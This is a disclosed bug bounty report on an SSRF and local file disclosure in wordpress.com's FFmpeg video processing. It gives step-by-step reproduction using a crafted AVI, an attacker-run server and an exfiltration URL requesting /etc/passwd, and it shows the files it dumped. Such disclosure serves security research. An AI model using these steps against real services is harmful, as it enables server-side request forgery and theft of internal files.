# SSRF and local file disclosure in https://wordpress.com/media/videos/ via FFmpeg HLS processing

## Report Details
- **Report ID**: 237381
- **URL**: https://hackerone.com/reports/237381
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-06-06T21:13:33.946Z
- **Disclosed**: 2017-07-29T15:30:07.191Z

## Reporter
- **Username**: neex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
### Summary

FFmpeg is a video encoding software that appears to be used by wordpress.com for video processing (for paid accounts). FFmpeg is known to process HLS playlists that may contain references to external files. I was able to fire this feature using GAB2 subtitle chunks inside an AVI file. After that, I was able to retrieve conversion nodes' local files and fire SSRF requests.

# Note that the AVI file attached is not a screen capture of the exploitation process, but the exploit itself. Do not try to play it!

### Reproduction steps for SSRF

1. Open attached file `http_q.avi` in a hex editor and find http link (currently it's `http://45.55.40.92/ssrf_test`). Modify it so it points to a server under your control. **You need to keep binary layout of the file, so you might want to add or remove some `#`s from the comment on the line below**
2. Go to https://wordpress.com/media/videos/<your blog>. **You need paid account to make this work**. Upload the resulting video, then select it, click "Edit" and wait a little bit.
3. You'll receive an HTTP request to your server from some server inside automattic. In the access log, you'll see an entry like this:
   
   ```
   192.0.87.12 - - [06/Jun/2017:21:42:35 +0200] "GET /test_ssrf HTTP/1.1" 200 117 "-" "Lavf/56.25.101"
   ```

   According to whois information, 192.0.87.12 belongs to Automattic, Inc.
    
    
### Reproduction steps for local file disclosure

Reading files is a little bit trickier --- it uses FFmpeg's ability to concatinate all segments of an HLS playlist into another playlist. I wrote a script that exploits this issue, `file_reading_server.py` (attached to the report). You'll need to run it on any server under your control  (of course, the script doesn't need to be run on the target server, it will use the SSRF & HLS playlists to retrieve files from it). 

1. Get a droplet/VPS/whatever with an external IP. Launch my script like this: `python3 file_reading_server.py --external-addr <external-ip-of-your-server> --port 8080` (you'll need python3.5).
2. As in SSRF repro step 1, modify `http_q.avi` so the link inside it will point to your server and be like this: `http://<external-ip-of-your-server>:8080/initial.m3u?filename=/etc/passwd`. You can replace `/etc/passwd` with another filename if you want.
3. As in SSRF repro step 2, upload the resulting file to wordpress.com and click "Edit". After a while, some debug output of my script will be printed to console (because of SSRF requests). Wait until the output stops. Then check the working dir of the script. It will contain a file with name like this: `<some random string>_<filename-without-slashes>`. The contents of this file was received from the node that runs FFmpeg.


Using this approach, I was able to dump `/etc/issue`:
```
Debian GNU/Linux 8 \n \l
``` 

and `/etc/hostname`:
```
tc1.videos.dca.wordpress.com
```


## Attachments
- http_q.avi
- file_reading_server.py
